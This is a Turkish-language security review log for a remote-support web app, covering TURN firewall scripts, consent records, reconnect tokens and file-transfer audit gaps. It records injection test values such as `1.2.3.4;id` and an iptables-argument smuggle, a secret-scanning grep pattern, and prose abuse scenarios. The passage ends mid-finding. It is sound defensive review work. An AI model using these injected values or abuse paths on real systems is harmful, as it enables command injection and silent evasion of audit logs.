| S-P3-8 | AÇIK (P7 giriş şartı)                     | Değişmedi. `endByTechnician` testi eklendi ama çağıran uç yok.                                                                                                                                                                                                                                                                                                                                   |

### Paylaşımlı sunucu etkisi (host-firewall.sh) — değerlendirme

- **Zincir kapsamı dar:** OUTPUT'a yalnız tek atlama ekleniyor. Zincirde yalnız DROP var, ACCEPT/RETURN yok. Bu yüzden
  diğer projelerin, UFW'nin (ufw-_) ve Docker'ın (DOCKER-_, nat, FORWARD) kural sırasını ve kararını değiştirmiyor.
  Bridge ağındaki konteyner trafiği OUTPUT'tan geçmiyor (FORWARD/INPUT). Etkilenebilecek tek paket şu: host ağ ad
  alanında 49160-49199'dan çıkan ve host'un kendi adresine aralık dışı porta giden UDP.
- **Reserved ports:** yalnız ephemeral (otomatik) atamayı etkiliyor. Açık `bind` serbest. ~28k'lık havuzdan 40 port
  çıkıyor, etkisi önemsiz. Mevcut liste korunuyor, remove yalnız tam eşleşen `49160-49199` girdisini çıkarıyor.
- **remove/uninstall:** yalnız kendi atlamasını (`-D OUTPUT -j REMOTE-TURN-OUT` döngüsü), kendi zincirini ve sabit adlı
  systemd dosyalarını siliyor. Değişken içeren `rm` yok. Başka zincire `-F/-X` uygulanmıyor.
- **Girdi doğrulama:** IP'ler v4/v6 regex'inden geçiyor, portlar yalnız rakam olabiliyor. `.env` `source` edilmiyor,
  yalnız `TURN_EXTERNAL_IP` satırı sed ile okunuyor. Denendi: `TURN_EXTERNAL_IP='1.2.3.4;id'` ve
  `TURN_FW_SELF_IPS='::1 -j ACCEPT'` → "geçersiz IP" ile durdu.
- **Entrypoint relay-ip:** `${TURN_EXTERNAL_IP#*/}` + `is_ipv4`. Birden fazla `/` reddediliyor. Yanlış IP verilirse
  coturn bind edemiyor ve kapalı kalıyor (fail closed).

### Yeni bulgular

#### S-P3-T2-1 [DÜŞÜK] host-firewall.sh: yarım uygulamada fail-open penceresi, satır tabanlı IP doğrulaması — A05

Yer: deploy/turn/host-firewall.sh:44-45 (`is_v4/is_v6`: `echo | grep -Eq`), :91-99 (`do_apply`: `-F` sonra tek tek `-A`), :63-70 (`reserve_add`)
Sorun:

1. `do_apply` önce zinciri boşaltıyor, sonra kuralları tek tek ekliyor. Bir `-A` hata verirse (ör. regex'ten geçen
   ama geçersiz olan `999.1.1.1` ya da `:::::`) betik `set -e` ile duruyor. OUTPUT atlaması yerinde kalıyor ama zincir
   boş ya da eksik oluyor (fail-open). Timer her 5 dakikada aynı hatayı tekrarlıyor.
2. `grep -Eq` satır bazında eşleştiriyor. Env'den gelen çok satırlı bir değerin yalnız ilk satırının geçerli olması
   yetiyor. Aynı kalıp `entrypoint.sh:15` `is_ipv4`'te de var; orada sonraki satır coturn config'ine yazılıyor
   (ör. `allow-loopback-peers`). Değeri yalnız root/.env sahibi verebildiği için güven sınırı aşılmıyor. Bu bir
   sertleştirme bulgusu.
3. Çekirdek, mevcut bir komşu ya da örtüşen rezervi bizim aralıkla birleştirirse `reserved_ok` (tam satır eşleşmesi)
   kalıcı olarak yanlış dönüyor. Bu durumda `check` sürekli başarısız oluyor, `ensure` her 5 dakikada `-F` ile yeniden
   uyguluyor, `remove` de birleşik aralığı geri alamıyor.
   İstismar senaryosu: Doğrudan dış istismar yok. Yönetici hatası ya da beklenmeyen bir çekirdek/modül hatası S-P3-2
   korumasını sessizce kaldırabilir.
   Düzeltme (devops): Kuralları geçici bir zincirde (`REMOTE-TURN-OUT-NEW`) kurun, başarılı olursa atlamayı değiştirip
   eskisini silin. Ya da tek seferde `iptables-restore --noflush` kullanın. IP doğrulamasını `case` kalıbı ve oktet
   ≤255 kontrolüyle yapın, `[ "$(printf %s "$1" | wc -l)" -eq 0 ]` ile çok satırlı değeri reddedin (entrypoint dahil).
   `reserved_ok` için kapsama kontrolü yeterli olmalı (reserve_add'deki awk mantığı); `check` hatasında timer sessizce
   döngüye girmemeli, journald'a `err` yazmalı.

#### S-P3-T2-2 [DÜŞÜK] systemd timer, repo klonundaki betiği 5 dakikada bir root olarak çalıştırıyor — A08

Yer: deploy/turn/host-firewall.sh:104-113 (`ExecStart=$SELF_PATH ensure`, `/opt/remote/deploy/turn/host-firewall.sh`)
Sorun: Root, repo çalışma kopyasındaki dosyayı ve aynı dizindeki `.env`/`turnserver.base.conf`'u periyodik olarak
çalıştırıyor/okuyor. `/opt/remote` root dışında bir kullanıcının (deploy/CI kullanıcısı) yazabileceği bir yer
olursa ya da `git pull` ile gelen bir değişiklik incelenmeden alınırsa, kod 5 dakika içinde root olarak çalışır.
Repo açık kaynak olduğu için katkı yolu da bir tedarik zinciri girişi. Bugün staging'e root ile SSH yapılıyor ve
klon root sahipli, bu yüzden risk düşük.
Düzeltme (devops): `install`, betiği `/usr/local/sbin/remote-turn-fw` olarak (root:root 0755) kopyalasın ve gerekli
değerleri (`TURN_EXTERNAL_IP`, aralık) `/etc/default/remote-turn-fw`'ye (root 0600) yazsın. Ya da en azından
`install`/`ensure` betik dizininin sahibini ve yazma izinlerini denetleyip (`stat`; group/other yazabiliyorsa)
reddetsin. Runbook §9.2.1'e "betik güncellenince `install` yeniden çalıştırılır" notu eklenmeli.

### Otomatik tarama çıktıları (Tur 2)

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks v8.30.1 (docker, dir modu, `.gitleaks.toml`): 10 eşleşme, **hepsi `apps/web/.next/**`** (`.previewinfo`,
  `prerender-manifest.json`, `preview-props.json` ve standalone kopyaları; git-ignore'daki derleme çıktısı, Next
  preview anahtarı). Kaynak/commit edilecek dosyalarda **0**.
- `sh -n host-firewall.sh` temiz; `print` staging girdisiyle beklenen 3+1 kuralı üretiyor.
- Regresyon: server unit **69/69** yeşil (bu turda koşuldu). Entegrasyon 93/93 implementation.md'den alındı, bu turda
  koşulmadı (MySQL gerekli).

### Öneri: `docs/gereksinimler.md` §9 "Sonra"

S-P3-T2-1, S-P3-T2-2 (P13/prod açılışından önce kapanmalı). S-P3-8 → P7 giriş şartı.

## P4 kod turu

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (+1 bilgi)

### Bulgular (öncelik sırasıyla)

#### S-P4-1 [ORTA] `ABUSE_EMAIL` deploy'a bağlanmamış → public resolve her zaman Super Admin e-postasını döndürür — A01/A04 (bilgi ifşası)

Yer: `apps/server/src/public/consent.ts:61-65`, `apps/server/src/sessions/service.ts:` resolve dönüşü (`abuseEmail: abuse`);
`deploy/docker-compose.yml` server `environment:` (ABUSE_EMAIL yok), `.env.example` (yok), `docs/runbook.md` (yok).
Sorun: Compose `env_file` kullanmıyor; değişken açıkça verilmediği için `env.ABUSE_EMAIL` prod/staging'de hep boş, fallback
devreye giriyor: ilk aktif Super Admin'in e-postası (= giriş kimliği) her geçerli bağlantı/kod sahibine JSON'da ve
karşılama sayfasında (`guest-welcome.tsx:99-100` mailto) verilir. CLAUDE.md "yeni env → .env.example + compose + runbook" kuralı da ihlal.
İstismar senaryosu: Dolandırıcı kendi tenant'ında (veya ele geçirilmiş teknisyen hesabıyla) bir oturum açıp linki
kendisi açar → platformun en yetkili hesabının giriş e-postasını öğrenir → hedefli oltalama / parola deneme / 2FA
sosyal mühendisliği. V13 kullanıcı kararıdır; risk karar sahibinin bilmesi gereken düzeyde.
Düzeltme: `ABUSE_EMAIL` → `.env.example` (boş) + compose server `environment` + runbook; production'da zorunlu
(`env.ts` refine, SESSION_REF_KEY kalıbı) ve Super Admin fallback'i yalnız development'ta. (atanan: devops + backend-dev)

#### S-P4-2 [DÜŞÜK] `apps/web` devDependency `ws@8.18.3` — GHSA-58qx-3vcg-4xpx (yüksek, DoS) + bellek ifşası (orta) — A06

Yer: `apps/web/package.json:38`. Yalnız e2e mock (`e2e/mock-ws.mjs`) kullanıyor; standalone prod imajına girmez, server `ws@8.21.0` temiz.
Düzeltme: `8.21.0`'a yükselt (CI `pnpm audit` kapısını da yeşillendirir). (atanan: frontend-dev)

#### S-P4-3 [DÜŞÜK] Müşteri adında kontrol/bidi karakteri filtresi yok — A03/A04

Yer: `packages/contracts/src/api/sessions.ts:104` (`trim().min(2).max(100)`).
Sorun: XSS yok (React metin, `dangerouslySetInnerHTML` yok; audit JSON). Ancak `‮`, satır sonu, sıfır genişlikli
karakterle teknisyen lobisinde/audit ekranında yanıltıcı ad ("Destek Ekibi — kodu okuyun") gösterilebilir.
Düzeltme: `\p{Cc}\p{Cf}` (bidi/ZW dahil) reddi veya temizleme; gerekirse `customerEmail` kullanılmıyorsa şemadan çıkar. (atanan: backend-dev)

#### S-P4-4 [DÜŞÜK] Müşteri adı teknisyen sekmesinin sessionStorage'ında çıkışta silinmiyor — A02/KVKK

Yer: `apps/web/lib/webrtc/use-tech-session.ts:13-28,128-133`. Yalnız `phase==="ended"` olunca silinir; sekme açık
kalıp logout yapılırsa veya konsoldan oturum bitmeden ayrılınırsa ad aynı sekmede kalır (paylaşımlı bilgisayar). Etki düşük (sekme kapanınca gider).
Düzeltme: logout'ta `rs.guestName.*` anahtarlarını temizle. (atanan: frontend-dev)

#### S-P4-5 [BİLGİ] Next `/ws` rewrite prod'da etkisiz

`next.config.ts` rewrite yalnız web'e ulaşan istekte çalışır; Caddy `/ws/*`'ı server'a önce yönlendiriyor ve web portu
yayımlanmıyor. Yalnız `/ws` (eğik çizgisiz) web'e düşer → server'da 404. Risk yok; istenirse rewrite `NODE_ENV!=="production"` koşuluna alınabilir.

### Doğrulanan kontroller (odak listesi)

- **KVKK onay bütünlüğü:** `acceptConsent` id + oturumun tenant'ı + `is_current` ile arar (başka tenant/eski sürüm → 400,
  ayırt edilmez); kayıt admit TX'inde `consumeForAdmit`=1 sonrası (count=0 → yazılmaz); bileşik FK
  `(consent_text_id, tenant_id, consent_sha256)` + `CHECK sha256 = SHA2(body,256)` + `app` için UPDATE/DELETE yok →
  metin değişmez, onay kaydı gösterilen sürüme bağlı. Join→admit arasında yeni sürüm yayımlanırsa müşterinin gördüğü
  sürüm kaydedilir (doğru davranış). Tek `is_current` fonksiyonel UQ ile.
- **Konsol yetkisi:** `/ws/tech` `row.technicianId !== auth.user.id` → 403 (`signaling/ws.ts:99`). Relay yalnız
  `room.tech.peer` ↔ `room.admitted.peer`; kabul edilmemiş misafirden SDP/ICE → 1008. SDP ≤60 KB, ICE ≤2000.
- **Terminate:** `sessions.terminate` yetkisi + `tenantScope` + `terminateActive(tenantId,id)` + audit; aynı TX.
- **Medya yönü:** teknisyen `addTransceiver("video",{direction:"recvonly"})`, hiç iz eklemiyor; misafir `sendonly`,
  `getUserMedia` yok, `audio:false`; Permissions-Policy `camera=() microphone=() display-capture=(self)`.
- **getDisplayMedia** yalnız `share-start` butonu `onClick` → `startShare`; yeniden bağlanmada otomatik paylaşım yok;
  `ended` olayında paylaşım durur; share-strip göstergesi.
- **Kimlik bilgisi saklama:** ticket/reconnect token yalnız bellek + `Sec-WebSocket-Protocol`; URL/depo/log yok; TURN
  credential yalnız `RTCPeerConnection` config'i ve ref'te; token sunucuda resolve edilir, istemci JS'ine verilmez.
- **ICE/IP ifşası:** tarayıcı varsayılanı mDNS host adayları; srflx adayı doğası gereği public IP verir (karşı taraf
  kimliği doğrulanmış teknisyen) — kabul edilmiş risk.
- **CSP/çerçeve:** `frame-ancestors 'none'` + `/session/*` proxy matcher içinde → ekran paylaşım sayfası çerçevelenemez;
  `connect-src 'self' wss://host`; `media-src` gereksiz (`srcObject` URL değil); `referrer: no-referrer`, `noindex`.

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: 2 (1 high, 1 moderate) — ikisi de `apps/web > ws@8.18.3` (S-P4-2).
- gitleaks v8.30.1 `dir` (.gitleaks.toml): 10 eşleşme, **tamamı `apps/web/.next/**`** (build çıktısı, preview-props;
  repoya girmez) → kaynakta 0.

### Tasarımda vaat edilip kodda bulunmayanlar

- `ABUSE_EMAIL` env üçlüsü (.env.example/compose/runbook) — S-P4-1.

### Olumlu

Onay modeli DB düzeyinde değişmez ve bileşik FK'lı; tüketim + onay + audit tek TX; nonce kind'ı sunucu kaydından;
relay sınırı sunucuda; misafir kimlik bilgileri bellekte; CSP nonce'lu, `unsafe-inline` yok.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"

S-P4-1 prod açılışından (P10/P13) önce kapanmalı; S-P4-2..4 P5 içinde.

## P4 kod turu 2

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+2 bilgi). Önceki S-P4-1..4 kapandı.

### Önceki bulguların doğrulaması

| Bulgu                                      | Durum                           | Kanıt                                                                                                                                                                                                                                                                                                              |
| ------------------------------------------ | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| S-P4-1 [ORTA] Super Admin e-postası ifşası | KAPANDI                         | `apps/server/src/public/consent.ts:68-73` — `fromEnv` yoksa ve `superAdminFallback=false` ise DB sorgusu yapılmadan `null`; `sessions/routes.ts:78-79` `superAdminFallback: NODE_ENV !== "production"`. Compose `deploy/docker-compose.yml:98` `ABUSE_EMAIL:` (değersiz geçiş), `.env.example`, runbook §3 güncel. |
| S-P4-2 [DÜŞÜK] web `ws` açığı              | KAPANDI                         | `apps/web/package.json:40` `ws: 8.21.0`; lockfile yalnız `ws@8.21.0`; `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".                                                                                                                                                                      |
| S-P4-3 [DÜŞÜK] görünmez karakterli ad      | KAPANDI (kalan kısım S-P4-T2-1) | `packages/contracts/src/api/sessions.ts:107,114` — `UNSAFE_NAME_CHARS` (C0/C1, U+200B-200F, bidi U+202A-202E/2066-2069, BOM) `refine` ile `.trim()` öncesi kontrol ediliyor; trim ile kenardaki kontrol karakterinin gizlenmesi engellendi.                                                                        |
| S-P4-4 [DÜŞÜK] sekmede müşteri adı kalması | KAPANDI                         | `apps/web/lib/session-storage.ts` `clearSessionData()` yalnız `rs.` önekli anahtarları siler, depolama kapalıysa sessiz; `app/(panel)/logout-button.tsx:29` çıkışta çağırıyor; birim testi var.                                                                                                                    |

### Yeni yüzeyler

- **hello.guestName / hello.share / peer.joined.guestName**: Yalnız `room.tech?.peer.send(...)` ile, aynı odanın teknisyenine gidiyor (`signaling/active.ts:18-28,78`, `rooms.ts:183`); misafire veya başka odaya yayın yok. `guest.name` kaynağı `joinSessionInputSchema` (max 100, kontrol/bidi filtresi) — giden şema da `max(100)` (`contracts/src/ws.ts:90,103`). Web tarafında `dangerouslySetInnerHTML`/`innerHTML` yok; ad React metni olarak basılıyor.
- **share.state spoof**: `onGuestMessage` (`signaling/handlers.ts:83-113`) yalnız `ADMITTED` misafirden ve `guest.peer === peer` iken işliyor; kabul edilmemiş misafir 1008 ile kapatılıyor. Yazılan tek yer `room.share` (kendi odası) ve kendi odasının teknisyeni; `rooms.ts:172` misafir ayrılınca `stopped`'a sıfırlıyor. Şema sıkı: `strictObject`, `monitors ≤16`, `id 0..64`, `name ≤64`, `w/h ≤16384`; çerçeve token bucket'tan geçiyor. Misafir yalnız kendi ekran durumunu "yanlış" bildirebilir — kendi oturumunu etkiler, güvenlik sınırı değil.
- **env.ts `withoutBlanks`** (`apps/server/src/env.ts:68-74`): boş/boşluk değerler tanımsız sayılıyor; prod zorunluları (`TRUSTED_PROXY_CIDR`, `SESSION_REF_KEY`) `refine` ile boşken yine hata veriyor, zorunlu `DATABASE_URL` boşken hata — `test/unit/env-logger.test.ts:27-38` kapsıyor. Hata mesajı yalnız anahtar adı içeriyor.
- **scripts/e2e-real-users.ts**: `NODE_ENV=production` iken çalışmıyor (`:58`); parola/e-posta yalnız env'den (sabit sır yok), parola 12-200 karakter, argon2id hash; yalnız `demo` tenant'ında ve yalnız mevcut ADMIN'e dokunuyor (başka tenant/rol → reddediyor, `:34`); her işlem audit'e yazılıyor. Bkz. S-P4-T2-2.
- **deploy/turn/entrypoint.sh TURN_LISTEN_IPS**: CR/LF içeren değer reddediliyor (config satır enjeksiyonu yok); her öğe `is_ipv4` (tam dize, 4 oktet, 0-255, baştaki sıfır yok) ile doğrulanıyor, aksi `die` (fail closed). Tırnaksız `for ip in $(...)` glob genişlemesi yapabilir ama genişleyen her öğe `is_ipv4`'te düşer → enjeksiyon yok. `auto` yalnız doğrulanmış `PRIVATE_IP` + 127.0.0.1.
- **"Cihaz desteklenmiyor" ekranı** (`apps/web/lib/device-support.ts`): yalnız istemci tarafı UX kontrolü; atlatılması güvenlik etkisi taşımaz, güvenlik sınırı olarak SAYILMAZ (yetki/kabul kontrolleri sunucuda: admit kodu, ADMITTED durumu, public client kontrolü ADR-0012).

### Bulgular

#### S-P4-T2-1 [DÜŞÜK] `UNSAFE_NAME_CHARS` bazı görünmez biçim karakterlerini kapsamıyor — A03/A04 (görüntü sahteciliği)

Yer: `packages/contracts/src/api/sessions.ts:107`
Sorun: U+00AD (soft hyphen), U+034F, U+061C (ALM, bidi), U+180E, U+2028/2029, U+2060-2064 (word joiner, invisible operators), U+FFF9-FFFB, etiket karakterleri U+E0000-E007F listede yok. U+061C bir bidi işaretidir.
İstismar senaryosu: Misafir "Ahmet⁠⁠" veya U+061C ile görünürde aynı/yanıltıcı ad girer; teknisyen konsolunda ve audit'te ad farklı bayt dizisiyle görünür. XSS yok (React metin); etkisi sınırlı kimlik karışıklığı.
Düzeltme: Liste yerine Unicode kategori: `/[\p{Cc}\p{Cf}\p{Zl}\p{Zp}͏᠎]/u` (Cf; ZWJ'li emoji desteklenmeyecekse yeterli). (atanan ajan: backend-dev)

#### S-P4-T2-2 [DÜŞÜK] `e2e-real-users.ts` prod imajında ve korumanın tek kaynağı `NODE_ENV` — A05

Yer: `apps/server/scripts/e2e-real-users.ts:58`; `apps/server/Dockerfile:56` (`COPY ... apps/server` → `scripts/` imaja giriyor)
Sorun: Script operatör aracıdır; prod imajında bulunuyor ve koruma yalnız `NODE_ENV`. Yerel makineden `DATABASE_URL` prod'u gösterecek şekilde (NODE_ENV tanımsız) çalıştırılırsa ve prod'da `demo` tenant'ı varsa (staging-users.sh oluşturur), o tenant'taki ADMIN'lerin parolası sıfırlanır ve `mustChangePassword=false` olur.
İstismar senaryosu: Doğrudan uzaktan istismar yok; operatör hatası / içeriden kötüye kullanım ile yetkili hesap parolası değişir (audit'te `source: e2e-real-users` kalır).
Düzeltme: Ek koruma `E2E_REAL_ALLOW=1` + DB host'unun localhost/staging allowlist'i, veya imajdan `scripts/` hariç tutma (`.dockerignore` / prod-deps aşamasında silme). (atanan ajan: devops)

#### Bilgi

- B-1: `deploy/docker-compose.yml:97` ve runbook §3 (`ABUSE_EMAIL` satırı) "boş dize geçerse server açılmaz" diyor; `withoutBlanks` sonrası bu artık doğru değil (boş = tanımsız). Güvenlik etkisi yok, doküman güncellenmeli (devops/teknik-yazar).
- B-2: `clearSessionData` yalnız çıkış butonunda; oturum süresi dolup 401 ile login'e yönlenmede çağrılmıyor. `sessionStorage` sekme kapanınca silindiği için risk düşük; isteğe bağlı olarak login sayfası yüklenirken de çağrılabilir.

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate` → `No known vulnerabilities found`
- `gitleaks` yerelde kurulu değil (CI'da çalışıyor). Elle tarama: `git grep -nE "(api[_-]?key|secret|password|token)\s*[:=]\s*['\"][^'\"]{8,}"` (test/e2e hariç) ve izlenmeyen yeni dosyalarda (`scripts/`, `src/public`, `src/signaling`, `web/lib`, `playwright.real.config.ts`, `e2e/p4-real.spec.ts`, `deploy/turn`, `contracts/src`) aynı desen → eşleşme yok. `.env.example` diff'i yalnız boş anahtarlar içeriyor. `.gitleaks.toml` allowlist'i yalnız `test/helpers/app.ts` ve `test/helpers/secrets.ts` (sahte değerler).
- `git log --all -- '*.env*'` → yalnız `d90dd2d` (`.env.example`; gerçek `.env` geçmişte yok).

### Olumlu

- S-P4-1 düzeltmesi fail-closed: prod'da DB'ye hiç gidilmiyor.
- Signaling tarafında misafir girdisi her yerde sıkı şema + kabul durumu + peer eşleşmesi ile korunuyor; oda dışına sızma yolu yok.
- entrypoint.sh tüm env değerlerinde satır sonu reddi ve IPv4 tam doğrulaması ile fail-closed.
- Orta/Düşük öneriler `docs/gereksinimler.md` §9'a "Sonra" olarak eklenebilir (S-P4-T2-1, S-P4-T2-2, B-1, B-2).

## P4 kod turu 3 (sayfa testi düzeltmesi: TEST-P4-1 F5 dönüşü, TEST-P4-2)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+1 bilgi). Dar kapsam: `apps/web/lib/guest-resume.ts`, `app/session/[token]/{guest-resume-gate,guest-session}.tsx`, `lib/webrtc/use-guest-session.ts`, `apps/server/src/signaling/{ws,rooms,active}.ts`.

### Oturum ele geçirme analizi (backend) — yeni vektör YOK

- **Token tek kullanımlık ve dönüyor:** `active.ts:31-46` `sendHelloGuest` her admit/yeniden bağlanmada eski `reconnectHash`'i siler, yeni token üretir; yeni token yalnız yeni misafir soketine gider. `teardown` (`rooms.ts:227`) haritadan siler.
- **Yarış (iki eşzamanlı reconnect aynı token ile):** `ws.ts:134-147` başarılı yolda `await` yok; `wss.handleUpgrade` (`ws.ts:55`, `verifyClient` yok, `perMessageDeflate:false`) geri çağrıyı eşzamanlı çalıştırır → `bindGuest → reattachGuest → sendHelloGuest` (token rotasyonu) aynı tikte biter. İkinci istek döndürülmüş hash'i bulamaz → 403 `reconnect`. Aynı token iki kez tüketilemez.
- **CLOSING penceresi** (`ws.ts:141` yalnız `isOpen()` çakışma): saldırganın bu pencereden faydalanması için _güncel_ reconnectToken'a zaten sahip olması gerekir; bu token'la misafir soketi kapandığı anda (önceki davranış) da devralabilirdi. Sunucu kaynaklı CLOSING yalnız `teardown`'da olur ve o anda oda/hash silinmiştir. Saldırgan misafirin soketini uzaktan CLOSING'e sokamaz. Pencere yeni bir yetki kazandırmıyor.
- `reattachGuest` (`rooms.ts:182-190`) eski peer'ı `detachGuest` ile ayırıyor (`share: stopped`, teknisyene `peer.left`); eski soketin geç `close`'u `guest.peer !== peer` (`rooms.ts:169`) ile etkisiz → durum karışması yok. Devralan taraf ekran paylaşımını otomatik almaz (paylaşım yeniden `getDisplayMedia` tıklaması ister).
- **peer.joined.maxEndsAt:** yalnız aynı odanın teknisyenine (`active.ts sendGuestJoined`), değer sunucu hesaplı (consumedAt + max_active_hours), hassas değil.

### Bulgular

### [DÜŞÜK] S-P4-T3-1 reconnectToken artık sekme deposunda kalıcı — A07 Identification and Authentication Failures / A04

Yer: `apps/web/lib/guest-resume.ts:10-17,58-64`; `app/session/[token]/guest-session.tsx:53-58`
Sorun: Token önceden yalnız bellekteydi; şimdi `sessionStorage['rs.resume.<sha256(link)[:16B]>']`'de. (a) XSS durumunda bellekten de ele geçirilebilirdi, fark küçük; CSP sıkı (`apps/web/proxy.ts:20` `'nonce-…' 'strict-dynamic'`, prod'da `unsafe-inline/eval` yok), web'de `dangerouslySetInnerHTML` yok. (b) Yeni yüzey tarayıcı davranışı: sessionStorage "Sekmeyi çoğalt" ve "Kapatılan sekmeyi yeniden aç" (Ctrl+Shift+T) ile kopyalanır/geri gelir; `window.open` (noopener olmadan) da kopyalar.
İstismar senaryosu: Paylaşılan bilgisayarda müşteri sekmeyi oturumu bitirmeden kapatır; oturum ACTIVE ve misafir soketi kapalıyken aynı makinedeki başka biri sekmeyi geri açar → lobisiz yeniden bağlanır (teknisyene "müşteri döndü" görünür). Etki sınırlı: ekran paylaşımı aynı makinenin ekranıdır ve yeniden tıklama ister; teknisyenin `peer.left/joined` görüp oturumu bitirebilmesi mevcut. Çoğaltılmış sekmede ise orijinal soket OPEN iken 403 conflict alır (devralma yok).
Düzeltme: Kabul edilebilir risk; isteğe bağlı sertleştirme — kayda `savedAt` ekleyip `RECONNECT_WINDOW_MS` (120 sn) aşan kaydı okumamak (F5 için yeterli, sekme geri açma penceresini daraltır); `pagehide` + `persisted=false` olmadan silme gerekmez. (atanan ajan: frontend-dev)

### [DÜŞÜK] S-P4-T3-2 Dönüş deneme penceresi sunucu ölü-soket süresinden kısa; her deneme audit satırı — A09 Security Logging and Monitoring Failures

Yer: `apps/web/lib/webrtc/use-guest-session.ts:20-21,96-106`; `apps/server/src/signaling/ws.ts:141-143,176-184`
Sorun: Sunucu ölü soketi en geç ~90 sn'de düşürür (30 sn ping, `missed >= 2` → 3. tikte `terminate`), istemci 20 × 3 sn ≈ 60 sn (+ status gecikmesi) dener → çökme/ağ kopmasında meşru dönüş `resumeFailed` olabilir (işlevsel). Ayrıca her 403 conflict `reconnect.conflict` audit satırı yazar: tek F5 için ≤ 20 satır. DoS açısından sınırlı: WS upgrade `guestIp` 31/dk/IP (`ws.ts:59`), status `statusIp` 60/dk/IP (`sessions/public.ts:121,213`); istemci 3 sn'de 1 upgrade + 1 status = 20/dk, limitlerin altında; 429 da yeniden denemeyi durdurmaz ama aralık sabit 3 sn, sınırlı (20).
İstismar senaryosu: Geçerli token sahibi biri (yalnız müşterinin kendisi) audit tablosunu dakikada ≤ 31 satırla doldurabilir — IP limitiyle sınırlı, yetki kazancı yok.
Düzeltme: backend-dev — `reconnect.conflict` audit'ini oda başına dakikada 1 ile tekilleştir (sayaç metrikte kalsın). frontend-dev — `RESUME_MAX_ATTEMPTS × RESUME_RETRY_MS`'i sunucu `pingMs × 3` + pay (≥ 100 sn, `RECONNECT_WINDOW_MS` 120 sn içinde) ile hizala.

### [BİLGİ] G-01 / G-13 ile uyum

- Depoya yazılan alanlar: `reconnectToken`, `technicianName`, `customerName`, `verifyCode`, `sessionRef` (zod şemalı, uzunluk sınırlı; bozuk kayıt silinir — `guest-resume.ts:45-56`). Link token'ı yazılmaz, anahtar SHA-256 önekidir (aynı origin'de başka link/oturumla karışma yok; 128 bit önek çakışması pratikte imkânsız).
- G-01: reconnectToken yalnız admit sonrası `hello`'dan gelir ve yalnız `state.reconnectToken` doluyken yazılır → lobi/kabul öncesi depoda token yok. `verifyCode` = `techVerifyCode` (müşterinin teknisyeni teyidi; resolve'da zaten müşteriye gösterilir, müşteriyi doğrulamaz) → gizli değil. `sessionRef` opak, status ucu yalnız `{status}` döner.
- G-13: TURN credential/iceServers depoya yazılmıyor (dönüşte `hello` yenisini verir). Çelişki yok.
- Silme: `ended` fazında (`guest-session.tsx:54`), `consumed` dışı sonlarda (`guest-resume-gate.tsx:30`), panel çıkışında `clearSessionData` (`rs.` öneki). Token URL/log'a yazılmıyor; WS'de `Sec-WebSocket-Protocol` ile gidiyor (Caddy logunda yazılmıyor, G-10).

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S-P4-T3-1 (kayda süre damgası), S-P4-T3-2 (conflict audit tekilleştirme + deneme penceresi hizalama).

---

## P5 kod turu 1 (sohbet, dosya transferi, işaretleme, kalite özeti)

Tarih: 2026-11-11 · Kapsam: `packages/contracts/src/{files,dc,ws}.ts`, `apps/server/src/signaling/{collab,handlers}.ts`, `apps/web/lib/dc/*`, `components/collab/*`, `components/guest/guest-collab.tsx`, `use-quality`, migration `20261111040000_p5_session_files`, `grants.sql`
DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 2 / Düşük 5

### [YÜKSEK] S-P5-1 Teklif seliyle `file.meta` kotası tüketilip gerçek transferin audit kaydı düşürülebiliyor — A09 Security Logging and Monitoring Failures

Yer: `apps/server/src/signaling/collab.ts:25-36,59-64` (oda başına ortak 20/dk + 500/oturum sayaç); `apps/web/lib/dc/files.ts:243-259` (her otomatik ret → `file.meta REJECTED`); `apps/web/lib/dc/use-collab.ts:60` (gelen ctl'de hız sınırı yok)
Sorun: Hız sınırı oda geneli ve sonuçtan bağımsız. Otomatik retler (busy/cooldown/tooLarge/caps) de kotadan yer. Gönderen taraf, alıcının istemcisine sınırsız `file.offer` yollayarak alıcının sunucuya `file.meta` göndermesini tetikleyebilir. Kota dolunca sonraki `OK` raporu `RATE_LIMITED` alıyor ve `session_files` ile `audit_logs`'a hiçbir şey yazılmıyor. Geride yalnız bir log uyarısı kalıyor.
İstismar senaryosu: Kötü niyetli bir teknisyen (içeriden tehdit) müşteriye A dosyasını teklif ediyor (müşteride "pending"). Ardından DC üzerinden 20 sahte teklif daha yolluyor. Müşteri istemcisi bunları "busy" olarak otomatik reddediyor ve 20 `file.meta` gönderiyor, böylece dakikalık pencere doluyor. Müşteri 60 sn içinde A'yı kabul ediyor. Transfer bitince gelen `OK` meta kaydı reddediliyor. Sonuç: müşteriye gönderilen (zararlı olabilecek) dosyanın adı ve SHA-256'sı hiçbir kayıtta yok. AC-55 ve audit zorunluluğu delinmiş oluyor. Aynı yolla 500/oturum kotası tüketilerek oturumun geri kalanı tamamen kayıtsız kalabilir.
Düzeltme: backend-dev: Kotayı sonuca göre ayırın. `OK`/`CORRUPT` (kabul edilmiş transferin sonucu) hiç düşürülmemeli ya da ayrı ve yüksek bir kotası olmalı. `REJECTED`/`CANCELLED` ayrı bir kotayla sınırlanmalı. Kota aşıldığında oturum başına bir kez `file.meta_rate_limited` audit satırı yazılmalı (sessiz kayıp olmamalı). frontend-dev: Alıcı istemci, otomatik retlerde `file.meta`'yı tekilleştirmeli/özetlemeli (ör. 10 sn'de en çok 1). Gelen `file.offer` için alıcı tarafında hız sınırı konmalı (ör. 5/10 sn, aşanlar sessizce düşer). Bu testle doğrulanmalı (21 teklif + 1 OK → OK kaydı var).

### [ORTA] S-P5-2 Teklif seli karşı tarafın WS bağlantısını 1008 ile kopartıyor ve listeyi sınırsız büyütüyor — A04 Insecure Design (DoS)

Yer: `apps/web/lib/dc/files.ts:230-262` (`inc` Map ve `list` sınırsız); `apps/server/src/signaling/handlers.ts:17,42` (TokenBucket 50/sn, aşımda `peer.close(POLICY)`)
